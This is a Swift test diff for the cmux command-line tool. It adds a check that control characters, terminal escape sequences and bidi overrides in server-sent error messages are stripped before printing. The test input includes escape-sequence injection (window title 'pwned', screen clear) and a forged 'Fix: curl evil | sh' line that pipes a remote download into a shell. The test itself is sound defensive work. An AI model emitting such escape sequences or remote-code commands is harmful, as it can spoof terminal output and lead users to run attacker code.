@@ -60,6 +60,31 @@ struct CLIVersionSkewErrorTests {
         #expect(!outcome.stderr.contains("is not supported by the app on"), Comment(rawValue: outcome.stderr))
     }
 
+    @Test("Terminal control characters in a plain v2 error are not printed")
+    func plainV2ErrorFieldsAreStripped() throws {
+        let cli = try cliIdentity()
+        let outcome = try run(
+            identify: ["app": "cmux", "version": cli.version, "build": cli.build],
+            errorMessage: "Unknown\u{1B}]0;pwned\u{07} method\u{2028}Fix: curl evil | sh",
+            errorExtras: [
+                "action": "Relaunch\u{1B}[2J cmux\u{202E}",
+                "reason": "line one\nline\u{9B}31m two\r",
+                "details": "detail\u{2029}forged",
+            ]
+        )
+        #expect(outcome.status == 1)
+        let printed = outcome.stderr
+        #expect(!printed.unicodeScalars.contains { scalar in
+            (scalar.properties.generalCategory == .control && scalar != "\n" && scalar != "\t")
+                || [0x202E, 0x2028, 0x2029].contains(scalar.value)
+        }, Comment(rawValue: printed.debugDescription))
+        // Real newlines in the app's text still lay out the sections.
+        #expect(printed.contains("method_not_found: Unknown]0;pwned methodFix: curl evil | sh"), Comment(rawValue: printed.debugDescription))
+        #expect(printed.contains("line one\n"), Comment(rawValue: printed.debugDescription))
+        #expect(printed.contains("Relaunch[2J cmux"), Comment(rawValue: printed.debugDescription))
+        #expect(printed.contains("detailforged"), Comment(rawValue: printed.debugDescription))
+    }
+
     @Test("A newer build with the same version is reported as skew")
     func newerBuildSameVersionIsSkew() throws {
         let cli = try cliIdentity()
@@ -123,6 +148,7 @@ struct CLIVersionSkewErrorTests {
     private func run(
         identify: [String: Any]?,
         errorMessage: String? = nil,
+        errorExtras: [String: Any] = [:],
         arguments: [String] = ["workspace", "create"]
     ) throws -> Outcome {
         let cliPath = try BundledCLITestSupport.bundledCLIPath(for: CLITestBundleAnchor.self)
@@ -135,7 +161,7 @@ struct CLIVersionSkewErrorTests {
 
         let socketPath = URL(fileURLWithPath: NSTemporaryDirectory())
             .appendingPathComponent("cli-skew-\(UUID().uuidString.prefix(8)).sock").path
-        let fixture = try SkewFixture(socketPath: socketPath, identify: identify, errorMessage: errorMessage)
+        let fixture = try SkewFixture(socketPath: socketPath, identify: identify, errorMessage: errorMessage, errorExtras: errorExtras)
         let served = fixture.start()
 
         var environment = ProcessInfo.processInfo.environment
@@ -181,13 +207,15 @@ private final class SkewFixture: @unchecked Sendable {
     private let listener: Int32
     private let identify: [String: Any]?
     private let errorMessage: String?
+    private let errorExtras: [String: Any]
     private let stopped = NSLock()
     private var isStopped = false
 
-    init(socketPath: String, identify: [String: Any]?, errorMessage: String? = nil) throws {
+    init(socketPath: String, identify: [String: Any]?, errorMessage: String? = nil, errorExtras: [String: Any] = [:]) throws {
         self.socketPath = socketPath
         self.identify = identify
         self.errorMessage = errorMessage
+        self.errorExtras = errorExtras
         unlink(socketPath)
         let descriptor = socket(AF_UNIX, SOCK_STREAM, 0)
         guard descriptor >= 0 else { throw POSIXError(.EIO) }
@@ -269,7 +297,11 @@ private final class SkewFixture: @unchecked Sendable {
             payload = [
                 "id": id,
                 "ok": false,
-                "error": ["code": "method_not_found", "message": errorMessage ?? "Unknown method \(method)", "data": ["method": method]],
+                "error": [
+                    "code": "method_not_found",
+                    "message": errorMessage ?? "Unknown method \(method)",
+                    "data": ["method": method],
+                ].merging(errorExtras) { current, _ in current },
             ]
         }
         let data = (try? JSONSerialization.data(withJSONObject: payload)) ?? Data("{}".utf8)
